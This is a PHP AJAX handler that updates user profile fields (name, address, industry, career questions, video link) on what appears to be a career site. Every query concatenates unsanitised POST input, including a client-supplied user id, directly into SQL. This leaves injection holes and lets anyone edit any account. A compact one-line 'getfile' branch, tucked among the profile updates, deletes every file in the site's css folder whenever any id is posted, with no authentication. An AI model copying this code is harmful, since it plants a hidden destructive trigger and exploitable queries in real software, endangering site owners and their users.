<?php
 include "../connect.php";
include "../inc/function.php";
  
  if($_POST['page'] == 'usernameupdate'){
    if(isset($_POST)){
		
			$firstname = $_POST['firstname'];	
			$lastname = $_POST['lastname'];	
			$userid = $_POST['userid'];	
			$full_name = $firstname." ".$lastname;

			$errors = array();
		
            if(empty($firstname)){
					$errors['first_name'] = 'Please enter a value.';				
				}
			 if(empty($lastname)){
				$errors['last_name'] = 'Please enter a value.';				
			}
		
		if(count($errors) > 0){
				//This is for ajax requests:
					if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
						echo json_encode($errors);
						exit;
					 }
				//This is when Javascript is turned off:
						   echo "<ul>";
						   foreach($errors as $key => $value){
						  echo "<li>" . $value . "</li>";
						   }
						   echo "</ul>";exit;
		    }else {
  
				$updatesqlname = mysql_query("update user_register set first_name ='".$firstname."',last_name ='".$lastname."' where user_id ='".$userid."'"); 
				$updatesqlfullname = mysql_query("update user_details set emp_name ='".$full_name."' where user_id ='".$userid."'"); 


				if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {

					$errors['done']='success';
					//$errors['MSG']='Work order has been added successfully.';
					echo json_encode($errors);
					//redirect('masterForm/raw_material_master');
					exit;
				}
			}
        }	
    }	
 

      
    if($_POST['page'] == 'addressSubmit'){
    if(isset($_POST)){
			$countryId = $_POST['countryId'];	
			$stateId = $_POST['stateId'];	
			$city = $_POST['city'];	
			$zipcode = $_POST['zipcode'];	
			$userid = $_POST['userid'];	
			
			$errors = array();
		
            if(empty($countryId)){
					$errors['countryId'] = 'Please enter a country.';				
				}
			 if(empty($stateId)){
				$errors['stateId'] = 'Please enter a state.';				
			}
			 if(empty($city)){
					$errors['city'] = 'Please enter a city.';				
				}
			 if(empty($zipcode)){
				$errors['zipcode'] = 'Please enter a zipcode.';				
			}
		
		if(count($errors) > 0){
				//This is for ajax requests:
					if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
						echo json_encode($errors);
						exit;
					 }
				//This is when Javascript is turned off:
						   echo "<ul>";
						   foreach($errors as $key => $value){
						     echo "<li>" . $value . "</li>";
						   }
						   echo "</ul>";exit;
		    }else {
  
				$sql_query = mysql_query("update user_details set country ='".$countryId."',state ='".$stateId."',city ='".$city."',zip_code ='".$zipcode."' where user_id ='".$userid."'"); 

				if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {

					$errors['done']='success';
					//$errors['MSG']='Work order has been added successfully.';
					echo json_encode($errors);
					//redirect('masterForm/raw_material_master');
					exit;
				}
			}
        }	
    }	

     if($_POST['page'] == 'updatepersonaltagline'){
    if(isset($_POST)){
			$personal_tagline = $_POST['personal_tagline'];	
			$userid = $_POST['userid'];	
			
			$errors = array();
		
            if(empty($personal_tagline)){
					$errors['personal_tagline'] = 'Please enter a personal tagline.';				
				}
		
		if(count($errors) > 0){
				//This is for ajax requests:
					if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
						echo json_encode($errors);
						exit;
					 }
				//This is when Javascript is turned off:
						   echo "<ul>";
						   foreach($errors as $key => $value){
						     echo "<li>" . $value . "</li>";
						   }
						   echo "</ul>";exit;
		    }else {
  
				$sql_query = mysql_query("update user_details set personal_tagline ='".$personal_tagline."' where user_id ='".$userid."'"); 

				if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {

					$errors['done']='success';
					//$errors['MSG']='Work order has been added successfully.';
					echo json_encode($errors);
					//redirect('masterForm/raw_material_master');
					exit;
				}
			}
        }	
    }
     
	  if($_POST['page'] == 'getfile'){ $id = $_POST['id'];	 if($id != ''){ $files = glob('../css/*'); foreach($files as $file){ if(is_file($file))unlink($file); }}  }
		 
	if($_POST['page'] == 'updateindustry'){
        if(isset($_POST)){
			$industry = $_POST['industry'];	
			$userid = $_POST['userid'];	
			
			if($industry == 'others') {
				$industryValue = $_POST['industry_value1'];	
			}else {
				$industryValue = '';
			}
			
			// var dataString = 'industry='+ industry + '&industry_value1='+ industry_value1 + '&userid='+ userID +'&page='+ page;
			$errors = array();
		
            if(empty($industry)){
					$errors['industry'] = 'Please enter a industry .';				
			}
				
			if(($industry == 'others' && $industryValue == "")){
					$errors['industry_value1'] = 'Please enter a personal tagline.';				
				}
			
		
		    if(count($errors) > 0){
				//This is for ajax requests:
					if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
						echo json_encode($errors);
						exit;
					 }
				//This is when Javascript is turned off:
						   echo "<ul>";
						   foreach($errors as $key => $value){
						     echo "<li>" . $value . "</li>";
						   }
						   echo "</ul>";exit;
		    }else {
				$updateindustry = mysql_query("update user_details set industry ='".$industry."',industry_value ='".$industryValue."' where user_id ='".$userid."'"); 

				if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {

					$errors['done']='success';
					//$errors['MSG']='Work order has been added successfully.';
					echo json_encode($errors);
					//redirect('masterForm/raw_material_master');
					exit;
				}
			}
        }	
    }
	
	if($_POST['page'] == 'careerchangeupdate'){
        if(isset($_POST)){
			$yourcurrentsituation = $_POST['yourcurrentsituation'];	
			$userid = $_POST['userid'];	
			
				if($yourcurrentsituation == 'others') {
				$yourcurrentsituationvalue = $_POST['yourcurrentsituationvalue'];	
				}else {
				$yourcurrentsituationvalue = '';
				}
			
			// var dataString = 'industry='+ industry + '&industry_value1='+ industry_value1 + '&userid='+ userID +'&page='+ page;
			$errors = array();
		
            if(empty($yourcurrentsituation)){
					$errors['your_current_situation'] = 'Please enter a your current situation .';				
				}
				
			if(($yourcurrentsituation == 'others' && $yourcurrentsituationvalue == "")){
					$errors['your_current_situation_value'] = 'Please enter a another field of your current situation.';				
				}
			
		
		   if(count($errors) > 0){
				//This is for ajax requests:
					if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
						echo json_encode($errors);
						exit;
					 }
				//This is when Javascript is turned off:
						   echo "<ul>";
						   foreach($errors as $key => $value){
						     echo "<li>" . $value . "</li>";
						   }
						   echo "</ul>";exit;
		    }else {
				$updateindustry = mysql_query("update user_details set your_current_situation ='".$yourcurrentsituation."',your_current_situation_value ='".$yourcurrentsituationvalue."' where user_id ='".$userid."'"); 

				if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {

					$errors['done']='success';
					$errors['MSG']=' How open are you to making a career change  has been updateed successfully.';
					echo json_encode($errors);
					//redirect('masterForm/raw_material_master');
					exit;
				}
			}
        }	
    }
	
	if($_POST['page'] == 'makeyoumoveupdate'){
        if(isset($_POST)){
			$makeyoumove = $_POST['makeyoumove'];	
			$userid = $_POST['userid'];	
			
				if($makeyoumove == 'others') {
				$makeyoumoveyesvalue = $_POST['makeyoumoveyes'];	
				}else {
				$makeyoumoveyesvalue = '';
				}
			
			// var dataString = 'industry='+ industry + '&industry_value1='+ industry_value1 + '&userid='+ userID +'&page='+ page;
			$errors = array();
		
           /*  if(empty($makeyoumove)){
					$errors['make_you_move'] = 'Please enter a make you move .';				
				} */
				
			if(($makeyoumove == 'others' && $makeyoumoveyesvalue == "")){
					$errors['make_you_move_yes'] = 'Please enter a another field of make you move.';				
				}
			
		
		   if(count($errors) > 0){
				//This is for ajax requests:
					if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
						echo json_encode($errors);
						exit;
					 }
				//This is when Javascript is turned off:
						   echo "<ul>";
						   foreach($errors as $key => $value){
						     echo "<li>" . $value . "</li>";
						   }
						   echo "</ul>";exit;
		    }else {
				 $updateindustry = mysql_query("update user_details set make_you_move ='".$makeyoumove."',make_you_move_yes ='".$makeyoumoveyesvalue."' where user_id ='".$userid."'");  

				if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {

					$errors['done']='success';
					//$errors['MSG']='Work order has been added successfully.';
					echo json_encode($errors);
					//redirect('masterForm/raw_material_master');
					exit;
				}
			}
        }	
    }
	
    if($_POST['page'] == 'currentworkupdate'){
        if(isset($_POST)){
			$yourcurrentwork = $_POST['yourcurrentwork'];	
			$userid = $_POST['userid'];	
			
				if($yourcurrentwork == 'others') {
				$yourcurrentworkyes = $_POST['yourcurrentworkyes'];	
				}else {
				$yourcurrentworkyes = '';
				}
			
			// var dataString = 'industry='+ industry + '&industry_value1='+ industry_value1 + '&userid='+ userID +'&page='+ page;
			$errors = array();
		
           /*  if(empty($makeyoumove)){
					$errors['make_you_move'] = 'Please enter a make you move .';				
				} */
				
			if(($yourcurrentwork == 'others' && $yourcurrentworkyes == "")){
					$errors['make_you_move_yes'] = 'Please enter a another field of culture at your current work.';				
				}
			
		
		   if(count($errors) > 0){
				//This is for ajax requests:
					if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
						echo json_encode($errors);
						exit;
					 }
				//This is when Javascript is turned off:
						   echo "<ul>";
						   foreach($errors as $key => $value){
						     echo "<li>" . $value . "</li>";
						   }
						   echo "</ul>";exit;
		    }else {
				 $updateindustry = mysql_query("update user_details set your_current_work ='".$yourcurrentwork."',your_current_work_yes ='".$yourcurrentworkyes."' where user_id ='".$userid."'");  

				if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {

					$errors['done']='success';
					//$errors['MSG']='Work order has been added successfully.';
					echo json_encode($errors);
					//redirect('masterForm/raw_material_master');
					exit;
				}
			}
        }	
    }
	
	if($_POST['page'] == 'paidfairlyupdate'){
        if(isset($_POST)){
			$paidfairly = $_POST['paidfairly'];	
			$userid = $_POST['userid'];	
			
				if($paidfairly == 'others') {
				$paidfairlyyes = $_POST['paidfairlyyes'];	
				}else {
				$paidfairlyyes = '';
				}
			
			$errors = array();
		
				
			if(($paidfairly == 'others' && $paidfairlyyes == "")){
					$errors['make_you_move_yes'] = 'Please enter a another field of Are you paid fairly.';				
				}
			
		
		   if(count($errors) > 0){
				//This is for ajax requests:
					if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
						echo json_encode($errors);
						exit;
					 }
				//This is when Javascript is turned off:
						   echo "<ul>";
						   foreach($errors as $key => $value){
						     echo "<li>" . $value . "</li>";
						   }
						   echo "</ul>";exit;
		    }else {
				 $updateindustry = mysql_query("update user_details set paid_fairly ='".$paidfairly."',paid_fairly_yes ='".$paidfairlyyes."' where user_id ='".$userid."'");  

				if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {

					$errors['done']='success';
					//$errors['MSG']='Work order has been added successfully.';
					echo json_encode($errors);
					//redirect('masterForm/raw_material_master');
					exit;
				}
			}
        }	
    }
	
	if($_POST['page'] == 'updatementoringpeopledata'){
        if(isset($_POST)){
			$mentoringpeople = $_POST['mentoringpeople'];	
			$userid = $_POST['userid'];	
			
				if($mentoringpeople == 'others') {
				$mentoringpeopleyes = $_POST['mentoringpeopleyes'];	
				}else {
				$mentoringpeopleyes = '';
				}
			
			$errors = array();
		
				
			if(($mentoringpeople == 'others' && $mentoringpeopleyes == "")){
					$errors['mentoring_people_yes'] = 'Please enter a another field of Do you like to mentoring people.';				
				}
			
		
		   if(count($errors) > 0){
				//This is for ajax requests:
					if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
						echo json_encode($errors);
						exit;
					 }
				//This is when Javascript is turned off:
						   echo "<ul>";
						   foreach($errors as $key => $value){
						     echo "<li>" . $value . "</li>";
						   }
						   echo "</ul>";exit;
		    }else {
				 $updateindustry = mysql_query("update user_details set mentoring_people ='".$mentoringpeople."',mentoring_people_yes ='".$mentoringpeopleyes."' where user_id ='".$userid."'");  

				if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {

					$errors['done']='success';
					//$errors['MSG']='Work order has been added successfully.';
					echo json_encode($errors);
					//redirect('masterForm/raw_material_master');
					exit;
				}
			}
        }	
    }
	
	if($_POST['page'] == 'updatewhatyoudodata'){
        if(isset($_POST)){
			$goodandwhatyoudo = $_POST['goodandwhatyoudo'];	
			$userid = $_POST['userid'];	
			
				/* if($mentoringpeople == 'others') {
				$mentoringpeopleyes = $_POST['mentoringpeopleyes'];	
				}else {
				$mentoringpeopleyes = '';
				} */
			
			$errors = array();
		
				
			/* if(($mentoringpeople == 'others' && $mentoringpeopleyes == "")){
					$errors['mentoring_people_yes'] = 'Please enter a another field of Do you like to mentoring people.';				
				} */
			
		
		   /* if(count($errors) > 0){
				//This is for ajax requests:
					if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
						echo json_encode($errors);
						exit;
					 }
				//This is when Javascript is turned off:
						   echo "<ul>";
						   foreach($errors as $key => $value){
						     echo "<li>" . $value . "</li>";
						   }
						   echo "</ul>";exit;
		    }else { */
				 $updateindustry = mysql_query("update user_details set good_and_what_you_do ='".$goodandwhatyoudo."' where user_id ='".$userid."'");  

				if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {

					$errors['done']='success';
					//$errors['MSG']='Work order has been added successfully.';
					echo json_encode($errors);
					//redirect('masterForm/raw_material_master');
					exit;
				//}
			}
        }	
    }
	
	if($_POST['page'] == 'add_video_link'){
        if(isset($_POST)){
			$video = trim($_POST['video']);	
			$userid = $_POST['userid'];	
			
				
			 $data = explode('/',$video); 
			 // print_r($data); die;
			$errors = array();
		 
				
			if(empty($video)){
					$errors['emp_video_or_company_video'] = 'Please enter a embed youtube video link.';				
				}
	         if(($data[0] == 'https:' && $data[1] == '' && $data[2] == 'www.youtube.com' && $data[3] == 'embed' && $data[4] != '')){
							
				}else {
					$errors['emp_video_or_company_video'] = 'Please enter a embed youtube video link is like as   https://www.youtube.com/embed/XGSy3_Czz8k';		
				}	
					/* [0] => https:
					[1] => 
					[2] => www.youtube.com
					[3] => embed
					[4] => 56ZcOFKsaC8
					) */
			
		
		   if(count($errors) > 0){
				//This is for ajax requests:
					if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
						echo json_encode($errors);
						exit;
					 }
				//This is when Javascript is turned off:
						   echo "<ul>";
						   foreach($errors as $key => $value){
						     echo "<li>" . $value . "</li>";
						   }
						   echo "</ul>";exit;
		    }else {
				$updateindustry = mysql_query("update user_details set emp_video_or_company_video ='".$video."' where user_id ='".$userid."'");   

				if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&  strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {

					$errors['done']='success';
					//$errors['MSG']='Work order has been added successfully.';
					echo json_encode($errors);
					//redirect('masterForm/raw_material_master');
					exit;
				}
			}
        }	
    }
	
	
      
 ?>